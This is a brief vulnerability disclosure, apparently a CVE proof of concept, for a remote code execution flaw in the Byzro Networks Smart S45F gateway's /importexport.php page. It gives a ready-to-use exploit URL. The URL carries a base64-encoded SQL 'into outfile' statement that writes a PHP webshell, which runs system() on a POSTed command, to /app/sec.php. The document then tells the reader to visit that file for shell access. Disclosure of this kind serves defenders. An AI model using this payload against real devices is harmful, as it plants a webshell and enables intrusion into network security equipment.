There is an rce injection vulnerability in the intelligent management platform of Byzro Networks Smart S45F multi-service security gateway.

version:S45F

/importexport.php

1.As shown in the figure login interface

![图片1](https://github.com/Chef003/cve/assets/131168641/d9d31cc9-fa33-47bd-8687-6193872408dc)


2.Construct POC and execute download

https://ip:port/importexport.php?sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc2VjLnBocCc=&type=exportexcelbysql

![图片2](https://github.com/Chef003/cve/assets/131168641/401e6f4f-cf4b-4361-870d-8ca1ebb46351)

3.Visit /app/sec.php to get the webshell.

![图片3](https://github.com/Chef003/cve/assets/131168641/8fa9d481-2916-4d10-aaa8-1883745d7687)
